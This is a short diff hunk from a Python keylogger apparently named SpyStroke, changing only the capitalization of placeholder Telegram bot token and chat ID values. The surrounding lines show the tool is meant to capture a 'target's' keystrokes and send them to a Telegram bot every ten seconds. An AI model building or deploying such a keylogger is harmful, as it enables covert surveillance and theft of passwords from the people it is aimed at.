@@ -14,8 +14,8 @@ logging.basicConfig(level=logging.CRITICAL)
 
 # Variables for keylogging and Telegram bot
 log = "Thanks for using SpyStroke! Target keystrokes will be coming."
-bot_token = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your Telegram bot token
-chat_id = "YOUR_TELEGRAM_CHAT_ID"  # Replace with your Telegram chat ID | USE https://t.me/chatIDrobot
+bot_token = "Your_Telegram_bot_Token"  # Replace with your Telegram bot token
+chat_id = "YOUR_Telegram_chat_ID"  # Replace with your Telegram chat ID | USE https://t.me/chatIDrobot
 interval = 10  # Time interval in seconds to send logs
 
 
